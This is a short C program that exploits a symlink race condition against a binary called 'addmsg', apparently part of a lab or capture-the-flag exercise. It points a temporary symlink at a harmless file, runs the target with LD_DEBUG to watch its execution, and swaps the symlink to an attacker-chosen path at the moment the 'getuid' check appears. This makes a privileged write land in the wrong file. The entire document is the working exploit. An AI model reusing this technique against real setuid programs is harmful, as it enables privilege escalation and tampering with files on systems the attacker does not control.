#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

int main() {
        char buf[1000];
        FILE *p;
        int done = 0;

        system("rm -f tmp/bbb; touch ./myfile");
        if (symlink("./myfile", "tmp/bbb")) {
                perror("first symlink");
                return 1;
        }
        p = popen("LD_DEBUG=all ./addmsg a ochoch 2>&1", "r");
        if (p == NULL) {
                fprintf(stderr, "cannot open pipe\n");
                return 1;
        }
        setbuf(p, NULL);
        while (fgets(buf, sizeof(buf), p)) {
                printf("test\n");
                if (!done && strstr(buf, "getuid")) {
                        unlink("tmp/bbb");
                        if (symlink("/tmp/exploit/zzz", "tmp/bbb")) {
                                perror("second symlink");
                                return 1;
                        }
                        done = 1;
                }
        }
        return 0;
}
